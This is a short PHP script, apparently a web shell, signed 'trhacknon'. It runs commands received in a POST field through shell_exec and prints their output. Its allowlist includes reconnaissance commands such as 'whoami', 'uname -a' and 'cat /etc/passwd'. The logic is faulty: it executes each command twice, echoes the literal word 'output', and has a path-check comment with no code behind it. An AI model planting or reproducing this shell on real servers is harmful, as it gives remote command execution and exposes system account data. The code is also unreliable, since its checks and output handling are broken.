<?php
  // Liste des commandes autorisées
  $allowedCommands = [
    "id",
    "uname -a",
    "ls",
    "whoami",
    "touch",
    "mkdir",
    "hostname",
    "cat /etc/passwd",
    "pwd"
  ];

  // Récupération de la commande passée en POST
  $command = $_POST['command'];
// Interdire l'accès aux fichiers en dehors du dossier courant
// Vérification pour s'assurer que le chemin de la commande est relative au dossier courant


  // Vérification que la commande est autorisée
  if (!in_array($command, $allowedCommands)) {
    http_response_code(403);
    die("Commande interdite par trhacknon");
  }
if (!empty($_POST['command']) && strpos($_POST['command'], '..') === false) {
  $output = shell_exec($_POST['command'] . ' 2>&1');
  echo "<pre>output</pre>";
} else {
  echo "Commande invalide.";
}
  // Exécution de la commande
  $output = shell_exec($command);

  // Affichage de la sortie de la commande
  echo $output;
?>
